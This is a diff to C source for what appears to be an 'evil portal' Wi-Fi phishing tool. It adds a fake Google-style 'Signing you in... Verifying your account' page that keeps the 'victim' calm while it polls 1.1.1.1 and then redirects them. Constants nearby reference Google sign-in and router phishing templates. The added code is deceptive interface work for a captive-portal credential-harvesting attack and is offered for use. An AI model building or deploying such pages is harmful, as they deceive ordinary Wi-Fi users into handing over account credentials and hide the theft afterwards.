@@ -154,5 +154,46 @@ const size_t EVIL_PORTAL_HTML_GOOGLE_STEP2_TPL_LEN = sizeof(EVIL_PORTAL_HTML_GOO
 const size_t EVIL_PORTAL_HTML_GOOGLE_FAILED_LEN = sizeof(EVIL_PORTAL_HTML_GOOGLE_FAILED) - 1;
 const size_t EVIL_PORTAL_HTML_ROUTER_LEN = sizeof(EVIL_PORTAL_HTML_ROUTER) - 1;
 
+// Smart redirect: polls for real internet via google.com/favicon.ico every
+// second. Redirects to google.com as soon as the poll succeeds (adapts to
+// actual bridge readiness, typically 3-10s). Falls back to forcing the
+// redirect after 30s if polling never succeeds. <meta refresh> at 30s is a
+// last-resort safety net for browsers that disable JS.
+const char EVIL_PORTAL_HTML_BRIDGE_REDIRECT[] =
+    "<!DOCTYPE html><html><head>"
+    "<meta http-equiv=\"refresh\" content=\"5;url=http://captive.apple.com/hotspot-detect.html\">"
+    "<title>Signing in...</title>"
+    "<style>body{margin:0;background:#202124;color:#e8eaed;font-family:Roboto,Arial,sans-serif;"
+    "display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;}"
+    "h1{font-weight:400;font-size:24px;margin:24px 0 8px;}p{color:#969ba1;margin:4px 0;}"
+    ".sp{width:48px;height:48px;border:3px solid #3c4043;border-top-color:#8ab4f8;"
+    "border-radius:50%;animation:spin 1s linear infinite;}"
+    "@keyframes spin{to{transform:rotate(360deg);}}</style>"
+    "</head><body>"
+    "<div class=\"sp\"></div>"
+    "<h1>Signing you in...</h1>"
+    "<p>Verifying your account, this may take a few seconds.</p>"
+    "<script>"
+    "(function(){"
+    "var start=Date.now();"
+    "function check(){"
+    "var img=new Image();"
+    "img.onload=function(){window.location.replace('https://1.1.1.1/');};"
+    "img.onerror=function(){"
+    "if(Date.now()-start<28000)setTimeout(check,500);"
+    "};"
+    // Poll raw IP (1.1.1.1) so no DNS lookup is needed. Chrome may have
+    // poisoned-cache entries for hostnames from the pre-bridge captive portal
+    // phase (TTL=1 helps but Chrome internal cache can be sticky). Redirect
+    // also goes to raw IP for the same reason. Victim sees Cloudflare's
+    // landing page = clear 'I have internet' confirmation.
+    "img.src='https://1.1.1.1/favicon.ico?_='+Date.now();"
+    "}"
+    "setTimeout(check,1500);"
+    "})();"
+    "</script>"
+    "</body></html>";
+const size_t EVIL_PORTAL_HTML_BRIDGE_REDIRECT_LEN = sizeof(EVIL_PORTAL_HTML_BRIDGE_REDIRECT) - 1;
+
 const char* const EVIL_PORTAL_HTML_GOOGLE = EVIL_PORTAL_HTML_GOOGLE_STEP1;
 const size_t EVIL_PORTAL_HTML_GOOGLE_LEN = sizeof(EVIL_PORTAL_HTML_GOOGLE_STEP1) - 1;
